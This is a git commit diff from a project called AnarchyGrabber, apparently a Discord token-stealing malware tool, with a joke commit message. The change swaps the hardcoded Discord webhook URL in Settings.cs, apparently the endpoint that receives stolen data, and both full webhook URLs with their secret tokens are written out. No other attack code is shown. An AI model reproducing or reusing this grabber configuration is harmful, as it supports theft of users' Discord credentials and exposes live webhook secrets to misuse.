ec3847661f91c0608bfef935767e774d4ac97b84
iLinked <ilinkedisameme@gmail.com>
2020-03-14 17:12:09 +0100

    karen took the kids

--- AnarchyGrabber/Settings.cs
+++ AnarchyGrabber/Settings.cs
@@ -2,6 +2,6 @@
 {
     class Settings
     {
-        public static string Webhook = "https://discordapp.com/api/webhooks/688416573660070032/ei3JruxvDlOiuSaOPIrTDKQt8wMKXYos-0COTUa9WpmTXcTCr_QinSs5dpmucln8QwzD";
+        public static string Webhook = "https://discordapp.com/api/webhooks/688419047615758344/gKsk2mOl1Bk8LcCodjIqgZS48kNGeRLC53JB6XXQJ9yk_Zymtkg-W3KUEV2j9RTNGTmh";
     }
 }
